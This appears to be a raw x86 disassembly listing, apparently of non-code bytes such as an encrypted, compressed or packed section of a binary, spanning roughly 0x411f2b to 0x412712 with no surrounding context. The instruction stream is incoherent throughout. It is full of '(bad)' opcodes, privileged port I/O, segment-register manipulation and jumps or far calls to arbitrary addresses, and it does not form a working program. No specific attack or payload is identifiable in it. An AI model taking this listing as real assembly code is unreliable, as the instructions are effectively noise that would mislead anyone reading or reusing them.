  411f2b:	mov    eax,0x4ad80774
  411f30:	jae    0x411ef1
  411f32:	stc    
  411f33:	push   0x29
  411f35:	pop    edx
  411f36:	xlat   BYTE PTR ds:[ebx]
  411f37:	sub    BYTE PTR [ebx+ecx*8],al
  411f3a:	add    al,0x70
  411f3c:	push   ebp
  411f3d:	and    bl,BYTE PTR ds:0x192e9386
  411f43:	cwde   
  411f44:	jbe    0x411ee1
  411f46:	popf   
  411f47:	jge    0x411ef2
  411f49:	popf   
  411f4a:	sbb    edi,esi
  411f4c:	jae    0x411efa
  411f4e:	das    
  411f4f:	mov    edi,0x78f2100
  411f54:	or     DWORD PTR cs:[esi],edx
  411f57:	leave  
  411f58:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411f59:	retf   
  411f5a:	pop    ds
  411f5b:	adc    al,0xf8
  411f5d:	mov    eax,0x58c9c126
  411f62:	shr    esi,cl
  411f64:	jecxz  0x411f56
  411f66:	loop   0x411fc1
  411f68:	out    0x9c,eax
  411f6a:	int3   
  411f6b:	pop    ecx
  411f6c:	popa   
  411f6d:	jmp    0xb82a3377
  411f72:	mov    eax,0xf9ec9a37
  411f77:	mov    WORD PTR [ebp-0x3b],ds
  411f7a:	jmp    0x411f88
  411f7c:	(bad)  [esi+0x1ddca107]
  411f82:	inc    ebp
  411f83:	std    
  411f84:	mov    eax,0x9532da04
  411f89:	mov    cl,0xfa
  411f8b:	jns    0x411fef
  411f8d:	pop    es
  411f8e:	sbb    bh,dl
  411f90:	pop    ebx
  411f92:	add    esi,edi
  411f94:	jns    0x411f7b
  411f96:	push   esi
  411f97:	cmp    ch,BYTE PTR [ebp+0x73]
  411f9a:	pop    ebx
  411f9b:	pop    es
  411f9c:	(bad)  
  411f9d:	xchg   ebp,eax
  411f9e:	int3   
  411f9f:	stos   BYTE PTR es:[edi],al
  411fa0:	add    BYTE PTR [edx-0x68],0xcb
  411fa4:	adc    BYTE PTR [edi],ch
  411fa6:	add    al,0x4a
  411fa8:	es sub esp,ebx
  411fab:	pop    ss
  411fac:	pop    ebp
  411fad:	push   0xcef347c1
  411fb2:	mov    fs,WORD PTR [ebp-0x52dd08e]
  411fb8:	jns    0x411f50
  411fba:	jno    0x411f81
  411fbc:	stos   DWORD PTR es:[edi],eax
  411fbd:	(bad)
  411fc0:	jp     0x412014
  411fc2:	sub    DWORD PTR [ebp-0x54570f32],esi
  411fc8:	jle    0x412003
  411fca:	inc    eax
  411fcb:	fs jle 0x411f75
  411fce:	inc    ebp
  411fcf:	js     0x411f75
  411fd1:	or     al,0x77
  411fd3:	fnsave ds:[eax-0x12]
  411fd7:	lds    edi,FWORD PTR [eax+0x3e8c146e]
  411fdd:	pop    eax
  411fde:	push   ss
  411fdf:	call   0xb2a8e05b
  411fe4:	mov    bl,0x64
  411fe6:	(bad)  
  411fe7:	lahf   
  411fe8:	inc    ecx
  411fe9:	stc    
  411fea:	jns    0x411fcf
  411fec:	adc    ebp,DWORD PTR [ecx-0x55]
  411fef:	out    dx,eax
  411ff0:	pop    ss
  411ff1:	fdivp  st(4),st
  411ff3:	(bad)  
  411ff5:	jl     0x411ff7
  411ff7:	shl    DWORD PTR [edx-0x50e1c2b9],0xa2
  411ffe:	push   edi
  411fff:	jae    0x411fab
  412001:	ror    BYTE PTR [esi-0x25],cl
  412004:	lock mov eax,0xa8221cd
  41200a:	jl     0x41200b
  41200c:	sbb    ah,BYTE PTR [eax]
  41200e:	jno    0x41205a
  412010:	adc    eax,0x52cd7ea4
  412015:	dec    edi
  412016:	xor    DWORD PTR [eax-0x25],ebp
  412019:	or     ecx,ebp
  41201b:	ret    
  41201c:	cmc    
  41201d:	repnz imul edi,DWORD PTR [ecx-0x66],0x57
  412022:	ds jle 0x411ff5
  412025:	and    cl,BYTE PTR [ebp-0x4]
  412028:	call   0xe298:0x70b9f1cc
  41202f:	pop    eax
  412030:	jmp    0x9e853d6c
  412035:	out    dx,eax
  412036:	popa   
  412037:	inc    eax
  412038:	sub    al,0xcc
  41203a:	inc    edx
  41203b:	(bad)  
  41203c:	xlat   BYTE PTR ds:[ebx]
  41203d:	sub    al,0x52
  41203f:	and    ch,ch
  412041:	push   ebx
  412042:	jnp    0x41209e
  412044:	test   eax,0x7a58d42b
  412049:	sar    DWORD PTR [ecx],1
  41204b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41204c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41204d:	loope  0x41203a
  41204f:	pop    ds
  412050:	add    bl,al
  412052:	loop   0x411fea
  412054:	adc    esi,ebp
  412056:	push   eax
  412057:	mov    dl,0x54
  412059:	addr16 inc esi
  41205b:	push   0xa30c7145
  412060:	stos   DWORD PTR es:[edi],eax
  412061:	cmp    DWORD PTR ds:0x6aa89435,esp
  412067:	xor    eax,0x544eb5f8
  41206c:	mov    dl,0xe7
  41206e:	(bad)
  412071:	popa   
  412072:	fild   WORD PTR [ebx-0x41]
  412075:	mov    esi,0x64750db
  41207a:	pushf  
  41207b:	fcomip st,st(4)
  41207d:	and    ebx,edx
  41207f:	push   edx
  412080:	mov    eax,0x94556448
  412085:	and    DWORD PTR [ecx-0x2895c1c9],edi
  41208b:	ins    BYTE PTR es:[edi],dx
  41208c:	lea    esi,[edx]
  41208e:	and    DWORD PTR [edx+ebp*8],ebx
  412091:	sub    edi,edx
  412093:	push   es
  412094:	sub    ah,cl
  412096:	mov    edx,DWORD PTR [edx]
  412098:	in     al,dx
  412099:	out    dx,eax
  41209a:	jmp    0xe22c8cf8
  41209f:	out    dx,eax
  4120a0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4120a1:	or     al,0x46
  4120a3:	xchg   esi,ecx
  4120a5:	pop    eax
  4120a6:	jg     0x41205e
  4120a8:	(bad)  
  4120aa:	or     bl,0x21
  4120ad:	push   esi
  4120ae:	jnp    0x41204a
  4120b0:	bound  esp,QWORD PTR [esi+0x7]
  4120b3:	ins    DWORD PTR es:[edi],dx
  4120b4:	inc    ecx
  4120b5:	icebp  
  4120b6:	push   edx
  4120b7:	pop    ecx
  4120b8:	loopne 0x4120ba
  4120ba:	arpl   WORD PTR [ebp+0x335cb5b8],di
  4120c0:	xchg   ebx,eax
  4120c1:	mov    ds:0xf4f70b74,al
  4120c6:	fimul  DWORD PTR [ecx+0x7c]
  4120ca:	fucomi st,st(6)
  4120cc:	bound  ebx,QWORD PTR [eax-0x7f]
  4120cf:	mov    ds:0x72370bfe,al
  4120d4:	aad    0x92
  4120d6:	das    
  4120d7:	addr16 xchg ecx,eax
  4120d9:	mov    ebp,0x440120c6
  4120de:	jmp    0x68f65b2e
  4120e3:	stc    
  4120e4:	out    0xe0,eax
  4120e6:	sub    BYTE PTR [esi],bh
  4120e8:	push   esp
  4120e9:	imul   edi,DWORD PTR ds:[eax+0x5807f96],0xffffffb6
  4120f1:	mov    ecx,0xeba8d88a
  4120f6:	ss out dx,eax
  4120f8:	(bad)  
  4120f9:	jmp    0x412084
  4120fb:	(bad)  
  4120fc:	cli    
  4120fd:	xchg   esp,eax
  4120fe:	mov    esp,0x9eca858f
  412103:	fwait
  412104:	add    BYTE PTR [ebp+0x7b],bh
  412107:	cmp    al,0x42
  412109:	jg     0x412096
  41210b:	dec    ecx
  41210c:	or     ah,cl
  41210e:	fmul   QWORD PTR [esi+0x5932adf1]
  412114:	pop    ebp
  412115:	fild   DWORD PTR [edi-0xace92d0]
  41211b:	fcomi  st,st(7)
  41211d:	cmp    edi,esi
  41211f:	xchg   bh,bl
  412121:	aam    0xbd
  412123:	fdiv   DWORD PTR [ecx+0x322fe97a]
  412129:	cli    
  41212a:	jns    0x4120c3
  41212c:	out    dx,eax
  41212d:	cli    
  41212e:	out    0xb9,al
  412130:	add    eax,0x4a2cdd77
  412135:	sbb    dl,BYTE PTR [ebp+0x6308989d]
  41213b:	rol    DWORD PTR [eax],0xd3
  41213e:	mov    dl,bh
  412140:	mov    ds:0x98079882,al
  412145:	mov    bl,0xd5
  412147:	sub    eax,0xefeaa513
  41214c:	push   eax
  41214d:	and    esp,esi
  41214f:	loop   0x41219f
  412151:	ins    DWORD PTR es:[edi],dx
  412152:	mov    cl,0x50
  412154:	fs in  eax,0x25
  412157:	dec    edx
  412158:	int3   
  412159:	stos   DWORD PTR es:[edi],eax
  41215a:	fwait
  41215b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41215c:	adc    ecx,ebx
  41215e:	xchg   esp,eax
  41215f:	pop    ecx
  412160:	mov    bh,bh
  412162:	push   edi
  412163:	jne    0x412181
  412165:	mov    cl,0x74
  412167:	adc    ecx,DWORD PTR [edx]
  412169:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41216a:	and    BYTE PTR [ebx-0x1e],al
  41216d:	adc    DWORD PTR [edx],ebp
  41216f:	ret    0x59e2
  412172:	push   ebp
  412173:	jmp    0x1d0d02ba
  412178:	dec    edx
  412179:	sbb    esi,ebx
  41217b:	(bad)  
  41217c:	jb     0x412190
  41217e:	cmp    ah,BYTE PTR [edx+0x5e]
  412181:	mov    WORD PTR [ebx-0x70],cs
  412184:	scas   eax,DWORD PTR es:[edi]
  412185:	and    dl,BYTE PTR [ebp+0x5a]
  412188:	cmc    
  412189:	jmp    0x921f:0x83d6106c
  412190:	(bad)  
  412191:	mov    ebx,gs
  412193:	cmp    al,bh
  412195:	mov    edi,0xdbd3abef
  41219a:	jns    0x4121d2
  41219c:	pop    ss
  41219d:	aam    0x94
  41219f:	sub    ebx,DWORD PTR ds:0x23e411d6
  4121a5:	add    eax,0x476a6a31
  4121aa:	push   ss
  4121ab:	lahf   
  4121ac:	jno    0x412147
  4121ae:	frstor [ecx+0x8]
  4121b1:	jb     0x4121d8
  4121b3:	aaa    
  4121b4:	add    esi,ebp
  4121b6:	push   es
  4121b7:	(bad)  
  4121b8:	imul   ebx,DWORD PTR [edx-0x8e3e389],0xd9dfb13
  4121c2:	mov    ds:0x8454c4d9,eax
  4121c7:	and    al,0x54
  4121c9:	jge    0x4121d2
  4121cb:	cmp    esp,0x88ad0910
  4121d1:	cmp    DWORD PTR [ebp+0x162d1f10],edx
  4121d7:	call   0xac9e367e
  4121dc:	push   esp
  4121dd:	ret    0x84d
  4121e0:	pop    ds
  4121e1:	in     eax,dx
  4121e2:	and    al,0x41
  4121e4:	mov    ecx,0xd426d9cb
  4121e9:	add    eax,0x73681f67
  4121ee:	add    DWORD PTR [edx+0x4a],ebx
  4121f1:	(bad)  
  4121f2:	xchg   esi,eax
  4121f3:	and    ah,BYTE PTR [edx+edx*1]
  4121f6:	jno    0x4121cd
  4121f8:	aas    
  4121f9:	jmp    0x412201
  4121fb:	jle    0x412213
  4121fd:	std    
  4121fe:	xchg   ebx,eax
  4121ff:	stc    
  412200:	pop    esp
  412201:	mov    eax,ds:0x52fc0433
  412206:	mov    ch,0x7b
  412208:	push   es
  412209:	and    dh,BYTE PTR [ecx+0x551601da]
  41220f:	jne    0x41220b
  412211:	stos   DWORD PTR es:[edi],eax
  412212:	into   
  412213:	and    eax,0xde8573d6
  412218:	sub    eax,0x868ed315
  41221d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41221e:	in     eax,0x70
  412220:	repz pop es
  412222:	pop    edx
  412223:	mov    dl,0xf0
  412225:	add    dh,BYTE PTR [ebx]
  412227:	mov    al,0x2c
  412229:	push   es
  41222a:	sar    DWORD PTR [ebx+ebp*2],1
  41222d:	adc    eax,0x3f271091
  412232:	je     0x4121b6
  412234:	sub    BYTE PTR [ecx+0x34],dh
  412237:	mov    al,0x85
  412239:	aas    
  41223a:	ret    0x1603
  41223d:	imul   edi,DWORD PTR [edx-0x31],0x72
  412241:	gs inc ecx
  412243:	pop    esp
  412244:	jge    0x4121d4
  412246:	jl     0x4121d2
  412248:	pop    eax
  412249:	jl     0x4122b4
  41224b:	mov    eax,0x800d152b
  412250:	(bad)  
  412251:	aad    0x6a
  412253:	push   ebx
  412254:	aas    
  412255:	push   es
  412256:	mov    edi,0x7b8657fe
  41225b:	xor    bl,BYTE PTR [edi-0x35da5445]
  412261:	test   ebp,edi
  412263:	mov    DWORD PTR [eax],edx
  412265:	mov    edx,0xbd138449
  41226a:	in     eax,0x58
  41226c:	push   es
  41226d:	adc    ebx,DWORD PTR [ebx-0x21]
  412270:	ja     0x412266
  412272:	xchg   edx,eax
  412273:	cmp    DWORD PTR [ebx],edx
  412275:	hlt    
  412276:	sub    ecx,ebp
  412278:	imul   ebx,DWORD PTR [edx],0x4f1a35e1
  41227e:	xor    al,0x7f
  412280:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412281:	mov    bh,0x72
  412283:	jmp    0x412213
  412285:	int3   
  412286:	ret    
  412287:	mov    bh,0x95
  412289:	(bad)  
  41228a:	fwait
  41228b:	adc    BYTE PTR [edi],ch
  41228d:	jle    0x412219
  41228f:	in     eax,dx
  412290:	inc    ecx
  412291:	jmp    0x412294
  412293:	rol    DWORD PTR [ebx+0x42],cl
  412296:	add    eax,0x355d9221
  41229b:	jno    0x41230c
  41229d:	sbb    ecx,0x6bd75804
  4122a3:	or     BYTE PTR [edi-0x2c],bl
  4122a6:	add    ch,al
  4122a8:	xor    ebp,edx
  4122aa:	pop    eax
  4122ab:	mov    ebp,0x9f83009e
  4122b0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4122b1:	mov    WORD PTR [ebp-0x1c],es
  4122b4:	ret    0x264f
  4122b7:	xor    edx,DWORD PTR [ebx-0x80]
  4122ba:	cmc    
  4122bb:	add    DWORD PTR [edi],ebx
  4122bd:	bswap  esi
  4122bf:	or     al,0x36
  4122c1:	xchg   ebx,eax
  4122c2:	push   ebx
  4122c3:	not    DWORD PTR [ecx-0x77]
  4122c6:	jle    0x41224a
  4122c8:	push   ebx
  4122c9:	js     0x41233a
  4122cb:	pusha  
  4122cc:	loop   0x412329
  4122ce:	xchg   BYTE PTR [ecx-0x57b692a2],dl
  4122d4:	push   cs
  4122d5:	mov    al,0x74
  4122d7:	fcomp  DWORD PTR [ebx]
  4122d9:	rcr    DWORD PTR [edi+0x7d664d95],0x3
  4122e0:	or     DWORD PTR [ebp-0x51],0x79
  4122e4:	rcl    BYTE PTR ds:0xf3d61a08,cl
  4122ea:	xlat   BYTE PTR ds:[ebx]
  4122eb:	sub    al,0xd8
  4122ed:	lods   eax,DWORD PTR ds:[esi]
  4122ee:	out    dx,eax
  4122ef:	mov    ds:0x583c9d4e,al
  4122f4:	aas    
  4122f5:	out    dx,al
  4122f6:	cwde   
  4122f7:	jmp    0x41236c
  4122f9:	js     0x412352
  4122fb:	or     al,0x7c
  4122fd:	shl    BYTE PTR [ebx+ebx*8-0x3a6212df],0x75
  412305:	scas   eax,DWORD PTR es:[edi]
  412306:	scas   eax,DWORD PTR es:[edi]
  412307:	pop    esi
  412308:	mov    edi,0x531245b6
  41230d:	sahf   
  41230e:	addr16 gs sbb al,0xa2
  412312:	mov    ebp,0xf76061b7
  412317:	dec    edx
  412318:	jl     0x4122cb
  41231a:	push   edi
  41231b:	adc    DWORD PTR [esi-0x17],edx
  41231e:	or     eax,0x39252e80
  412323:	cmp    eax,0x9fd366b3
  412328:	ss out 0xaa,ax
  41232c:	jb     0x412375
  41232e:	pop    esi
  41232f:	fwait
  412330:	pop    esi
  412331:	in     eax,0x46
  412333:	aas    
  412334:	jmp    0xb433e1b3
  412339:	jae    0x4123a5
  41233b:	jge    0x412323
  41233d:	mov    esi,0xb93727ed
  412342:	xor    BYTE PTR [edi],ah
  412344:	(bad)
  412348:	mov    bh,0xcd
  41234a:	pop    edi
  41234b:	lods   eax,DWORD PTR ds:[esi]
  41234c:	ja     0x412310
  41234e:	mov    eax,0x7db65b85
  412353:	stos   BYTE PTR es:[edi],al
  412354:	loop   0x41238c
  412356:	rcl    BYTE PTR [edx-0x50],0x96
  41235a:	adc    esi,DWORD PTR [ebp+eax*1+0x5e]
  41235e:	sub    cl,BYTE PTR [esi]
  412360:	xchg   ebp,eax
  412361:	xor    DWORD PTR [eax+0x7d],0x5c294cbc
  412368:	mov    edi,0x86240659
  41236d:	ins    BYTE PTR es:[edi],dx
  41236e:	ficom  DWORD PTR [edi]
  412370:	int3   
  412371:	scas   al,BYTE PTR es:[edi]
  412372:	stos   BYTE PTR es:[edi],al
  412373:	call   FWORD PTR [esi]
  412375:	lahf   
  412376:	in     al,dx
  412377:	xor    DWORD PTR [ecx],0xffffffc3
  41237a:	retf   
  41237b:	sar    BYTE PTR [ecx+0x7d],cl
  41237e:	push   esp
  41237f:	add    al,0x76
  412381:	adc    eax,0xb479784e
  412386:	int    0x2f
  412388:	shr    DWORD PTR [ecx+0x27e4ca12],0x3c
  41238f:	outs   dx,DWORD PTR ds:[esi]
  412390:	fucomp st(2)
  412392:	stos   DWORD PTR es:[edi],eax
  412393:	out    0xe3,eax
  412395:	push   0xbb0e5193
  41239a:	pop    ss
  41239b:	dec    esp
  41239c:	out    0xf1,al
  41239e:	and    DWORD PTR [ebx],ecx
  4123a0:	call   0x7ce1:0xf6df1f69
  4123a7:	popa   
  4123a8:	adc    ebx,DWORD PTR [ecx+0x46a7764a]
  4123ae:	add    DWORD PTR [eax],ecx
  4123b0:	sub    dh,0x1a
  4123b3:	sub    ch,BYTE PTR [ecx]
  4123b5:	mov    esi,0xb59cf212
  4123ba:	aad    0xe5
  4123bc:	(bad)  
  4123bd:	sub    ch,bl
  4123bf:	daa    
  4123c0:	push   ebx
  4123c1:	(bad)  
  4123c2:	ss inc esi
  4123c4:	sub    ecx,DWORD PTR [ecx]
  4123c6:	retf   
  4123c7:	mov    eax,0x21a0de93
  4123cc:	mov    esi,0x121fc583
  4123d1:	enter  0x6a5a,0xef
  4123d5:	sahf   
  4123d6:	rdpmc  
  4123d8:	cmp    ah,BYTE PTR [edi+0x2ab716b1]
  4123de:	push   eax
  4123df:	mov    ch,0x28
  4123e1:	mov    ch,0x6a
  4123e3:	xor    edx,DWORD PTR [eax+0x50]
  4123e6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4123e7:	sub    ch,BYTE PTR [edi]
  4123e9:	add    BYTE PTR [ebx],bl
  4123eb:	shl    ebp,1
  4123ed:	(bad)  
  4123ee:	into   
  4123ef:	pop    esp
  4123f0:	sbb    esi,DWORD PTR [edx-0x56f620b6]
  4123f6:	sbb    bl,BYTE PTR [edx+ecx*4+0x65842ed5]
  4123fd:	jge    0x4123e0
  4123ff:	js     0x41246f
  412401:	mov    edx,0x7120e1fb
  412406:	cmp    DWORD PTR [edx],ebx
  412408:	aam    0x89
  41240a:	mov    al,0x32
  41240c:	and    DWORD PTR [esi-0x79],ecx
  41240f:	fbld   TBYTE PTR [edi+0x7]
  412412:	xor    al,0xf7
  412414:	outs   dx,BYTE PTR ds:[esi]
  412415:	cmp    ah,BYTE PTR [ebp-0x17dfc06e]
  41241b:	lods   al,BYTE PTR ds:[esi]
  41241c:	dec    ecx
  41241d:	dec    esi
  41241e:	rol    DWORD PTR [edx],1
  412420:	xchg   esi,eax
  412421:	jg     0x4123c3
  412423:	aad    0x3c
  412425:	enter  0x37a8,0xa
  412429:	xor    eax,0x760942bd
  41242e:	and    ch,BYTE PTR [edi-0x72]
  412431:	mov    esp,ecx
  412433:	jb     0x412465
  412435:	pop    ds
  412436:	push   ecx
  412437:	(bad)  
  412438:	retf   0xca53
  41243b:	and    DWORD PTR [edi+0x24c36d06],edx
  412441:	or     BYTE PTR [ecx-0x17],0xc2
  412445:	iret   
  412446:	add    dl,BYTE PTR [ecx]
  412448:	dec    edx
  412449:	cmp    ch,dl
  41244b:	test   BYTE PTR [ebx],bl
  41244d:	jmp    0xb0fd:0x1a452d03
  412454:	test   DWORD PTR [ecx+eax*8],ecx
  412457:	out    dx,al
  412458:	test   eax,0x5d9b4f1d
  41245d:	mov    esi,0x8c49ac52
  412462:	lds    eax,FWORD PTR [eax-0x2b]
  412465:	fimul  DWORD PTR [ebx]
  412467:	xor    DWORD PTR ds:0xa41e597e,eax
  41246d:	cmp    eax,0x25931334
  412472:	mov    al,ds:0xfc48f280
  412477:	cmp    esp,DWORD PTR [edx-0x4d1bb7ee]
  41247d:	add    al,0x8d
  41247f:	push   0x8ab155b5
  412484:	cs push esp
  412486:	(bad)  
  412487:	(bad)  
  412488:	je     0x4124a3
  41248a:	neg    BYTE PTR [edx]
  41248c:	dec    esp
  41248d:	mov    cl,0x6c
  41248f:	adc    DWORD PTR [edx-0x80],edi
  412492:	or     eax,0xb90bd6a0
  412497:	inc    eax
  412498:	jg     0x92b9e85a
  41249e:	or     DWORD PTR [ecx*1-0x4aaf6ee4],edx
  4124a5:	xchg   ecx,eax
  4124a6:	(bad)  
  4124a7:	jmp    0x4124c2
  4124a9:	inc    ebp
  4124aa:	pop    eax
  4124ab:	in     eax,dx
  4124ac:	lock repz rol BYTE PTR ds:[edx+0x45],1
  4124b2:	cs call 0xff6c7157
  4124b8:	test   eax,0x45b36ab4
  4124bd:	outs   dx,BYTE PTR ds:[esi]
  4124be:	loopne 0x412495
  4124c0:	xchg   esp,edx
  4124c2:	xor    BYTE PTR [ebp*1-0x656d9e89],ah
  4124c9:	out    dx,eax
  4124ca:	into   
  4124cb:	sbb    eax,0x8ea3e3b6
  4124d0:	gs jns 0x4124d2
  4124d3:	add    cl,bh
  4124d5:	push   0xffffffa6
  4124d7:	push   ebx
  4124d8:	in     eax,dx
  4124d9:	mov    dh,0xa0
  4124db:	test   al,0xb8
  4124dd:	xor    BYTE PTR [edx+0x44],dh
  4124e0:	imul   edx,DWORD PTR [bx+si+0x3aa6],0xa4d0eead
  4124e9:	xchg   BYTE PTR [ebx],bl
  4124eb:	jg     0x4124a2
  4124ed:	xor    esi,0x93f9b2c8
  4124f3:	into   
  4124f4:	pop    esp
  4124f5:	sahf   
  4124f6:	and    eax,0x3d84ab2d
  4124fb:	add    BYTE PTR [ebp+0xbcc9dfc],ch
  412501:	xchg   edi,eax
  412502:	mov    edx,0x2bfd7b78
  412507:	push   esi
  412508:	push   esi
  412509:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41250a:	sub    BYTE PTR [edi],bl
  41250c:	loope  0x412535
  41250e:	das    
  41250f:	sahf   
  412510:	lea    esi,[ecx+ebx*8-0x1989fef3]
  412517:	jmp    0x66c3766d
  41251c:	lods   eax,DWORD PTR ds:[esi]
  41251d:	rcr    DWORD PTR [ebx-0x15],cl
  412520:	and    BYTE PTR [ebp+0x578d67fa],cl
  412526:	add    DWORD PTR ds:0xecf02cd4,0xe17afd32
  412530:	inc    eax
  412531:	sub    BYTE PTR [ecx],al
  412533:	xchg   ebx,eax
  412534:	ror    DWORD PTR ds:0xb081f2ed,0xcc
  41253b:	sub    al,0x3
  41253d:	outs   dx,BYTE PTR ds:[esi]
  41253e:	sub    al,BYTE PTR [ebx+0x29453463]
  412544:	push   es
  412545:	fwait
  412546:	pop    eax
  412547:	cmp    ch,BYTE PTR [esi]
  412549:	add    dl,BYTE PTR [ecx+0x7e27c284]
  41254f:	jg     0x412523
  412551:	call   0xb6f4:0xa877f8c8
  412558:	js     0x41250b
  41255a:	mov    edx,0xa2cc27c1
  41255f:	ret    
  412560:	pop    ds
  412561:	jecxz  0x4125a6
  412563:	cmp    ebp,DWORD PTR [edi+0x2e428d09]
  412569:	jbe    0x412548
  41256b:	jnp    0x4125c7
  41256d:	sub    DWORD PTR [ecx-0x1ffa6213],0x5e
  412574:	aam    0x9e
  412576:	or     ebx,DWORD PTR [ecx+ebp*8]
  412579:	push   0xa8ce9a5
  41257e:	and    edx,DWORD PTR [eax]
  412580:	mov    dl,0x5c
  412582:	leave  
  412583:	mov    dh,0x80
  412585:	cmp    DWORD PTR [esi+0x78cfc48c],esp
  41258b:	jle    0x412585
  41258d:	jge    0x4125bc
  41258f:	sbb    cl,BYTE PTR [edi]
  412591:	aas    
  412592:	sub    eax,DWORD PTR [edx+0x35]
  412595:	add    al,0xc0
  412597:	jno    0x41258b
  412599:	push   ds
  41259a:	ds loop 0x41258c
  41259d:	or     al,0x2
  41259f:	popa   
  4125a0:	jle    0x412542
  4125a2:	cdq    
  4125a3:	cmc    
  4125a4:	sbb    DWORD PTR [ebx],0xffffffac
  4125a7:	mov    al,ds:0xb1d1e4c4
  4125ac:	pop    edx
  4125ad:	retf   0x62ad
  4125b0:	xchg   esp,eax
  4125b1:	ret    0xa51
  4125b4:	cdq    
  4125b5:	and    ecx,esp
  4125b7:	outs   dx,BYTE PTR ds:[esi]
  4125b8:	xor    ch,bh
  4125ba:	pop    esi
  4125bb:	(bad)  
  4125bc:	scas   al,BYTE PTR es:[edi]
  4125bd:	sub    al,0x86
  4125bf:	(bad)  
  4125c0:	cmp    cl,dl
  4125c2:	push   edx
  4125c3:	iret   
  4125c4:	icebp  
  4125c5:	sub    eax,0xf1b71316
  4125ca:	mov    edi,0xd23181f2
  4125cf:	retf   
  4125d0:	inc    ebp
  4125d1:	fwait
  4125d2:	sti    
  4125d3:	cdq    
  4125d4:	sbb    ah,BYTE PTR [ecx-0x6355bd38]
  4125da:	mov    dl,0x1a
  4125dc:	mov    ecx,0xae64d650
  4125e1:	and    al,0x43
  4125e3:	loope  0x41260f
  4125e5:	dec    esp
  4125e6:	mov    eax,0xc23097cf
  4125eb:	cli    
  4125ec:	sub    BYTE PTR [esi+0x5840aab5],bl
  4125f2:	lods   al,BYTE PTR ds:[esi]
  4125f3:	(bad)  
  4125f4:	lock jno 0x412591
  4125f7:	mov    ebx,0x3a26b08e
  4125fc:	push   ss
  4125fd:	mov    dl,0x37
  4125ff:	into   
  412600:	imul   ebp,DWORD PTR ds:0xb6f7a465,0x49
  412607:	inc    ebx
  412608:	je     0x4125b7
  41260a:	mov    ebp,0xbc64f60e
  41260f:	and    eax,edx
  412611:	mov    ecx,0xd28f1831
  412616:	aam    0x4a
  412618:	add    BYTE PTR [ecx-0x1],bl
  41261b:	adc    eax,0x4b76a544
  412620:	jmp    0x9ac7:0x170ba562
  412627:	int    0x19
  412629:	cwde   
  41262a:	clc    
  41262b:	sahf   
  41262c:	dec    ebp
  41262d:	mov    ebp,0x37120e08
  412632:	push   esp
  412633:	xchg   ecx,eax
  412634:	scas   al,BYTE PTR es:[edi]
  412635:	inc    edi
  412636:	push   0x6d08caed
  41263b:	xchg   ecx,eax
  41263c:	jns    0x4125f1
  41263e:	scas   al,BYTE PTR es:[edi]
  41263f:	js     0x412684
  412641:	lock scas al,BYTE PTR es:[edi]
  412643:	lods   eax,DWORD PTR ds:[esi]
  412644:	addr16 push ecx
  412646:	mov    eax,ds:0xc8d3cbab
  41264b:	addr16 mov cl,0x1
  41264e:	leave  
  41264f:	in     al,dx
  412650:	and    ch,BYTE PTR ds:0x6d4a81ad
  412656:	mov    eax,ds:0x75bb0cd6
  41265b:	in     eax,0x88
  41265d:	push   0x2663e3f0
  412662:	cmp    ch,al
  412664:	jmp    0xa09dd0ec
  412669:	adc    al,BYTE PTR [ebx-0x5d]
  41266c:	add    DWORD PTR [ebx-0x13],ecx
  41266f:	sar    DWORD PTR [ecx-0x63],0xd5
  412673:	bound  edi,QWORD PTR [edx+eax*8]
  412676:	gs aam 0x4f
  412679:	jno    0x41267a
  41267b:	pushf  
  41267c:	(bad)  
  41267d:	idiv   BYTE PTR [ebp+0x52f3761f]
  412683:	int    0xaf
  412685:	fcomp  DWORD PTR [eax+eax*8+0x20571977]
  41268c:	les    ebp,FWORD PTR [esi]
  41268e:	push   esp
  41268f:	(bad)  
  412690:	sub    eax,0x8388ca71
  412695:	js     0x4126ca
  412697:	call   0xfc895529
  41269c:	jmp    0x4126e5
  41269e:	mov    ah,0x58
  4126a0:	cmp    al,0xa2
  4126a2:	lods   eax,DWORD PTR ds:[esi]
  4126a3:	push   ebp
  4126a4:	jle    0x41270f
  4126a6:	sti    
  4126a7:	rcl    ch,0xdf
  4126aa:	cmp    DWORD PTR [ebp-0x5a],ecx
  4126ad:	ret    
  4126ae:	xor    ah,BYTE PTR [ebp+0x3b]
  4126b1:	push   ss
  4126b2:	enter  0xc571,0xdb
  4126b6:	ret    0xe3d
  4126b9:	push   ebx
  4126ba:	sahf   
  4126bb:	inc    eax
  4126bc:	ds adc cl,cl
  4126bf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4126c0:	les    ebx,FWORD PTR [ecx]
  4126c2:	push   ds
  4126c3:	push   edx
  4126c4:	out    dx,eax
  4126c5:	mov    edx,DWORD PTR [edi-0x23df14fa]
  4126cb:	cs xchg edi,eax
  4126cd:	cmp    bh,BYTE PTR [eax-0x869b3b1]
  4126d3:	inc    edi
  4126d4:	pop    ebx
  4126d5:	sar    BYTE PTR [ebx+esi*1],1
  4126d8:	call   0xb27b:0xd597cd2d
  4126df:	jno    0x4126d4
  4126e1:	sub    BYTE PTR [ebx],0x2b
  4126e4:	xchg   edi,eax
  4126e5:	push   cs
  4126e6:	inc    esp
  4126e7:	jmp    0xbaac:0xca012e4e
  4126ee:	jbe    0x412767
  4126f0:	ss stos BYTE PTR es:[edi],al
  4126f2:	cmp    bl,dh
  4126f4:	jge    0x4126cd
  4126f6:	add    eax,DWORD PTR [ebx+edi*4]
  4126f9:	mov    esp,0x7507d553
  4126fe:	jns    0x412731
  412700:	pop    ds
  412701:	xchg   edx,eax
  412702:	in     al,0x5e
  412704:	jne    0x4126fa
  412706:	clc    
  412707:	cmp    ebp,edi
  412709:	icebp  
  41270a:	lods   eax,DWORD PTR ds:[esi]
  41270b:	and    ecx,DWORD PTR [eax-0x80]
  41270e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41270f:	xor    ecx,DWORD PTR [ebx]
  412711:	daa    
  412712:	add    al,0xa1
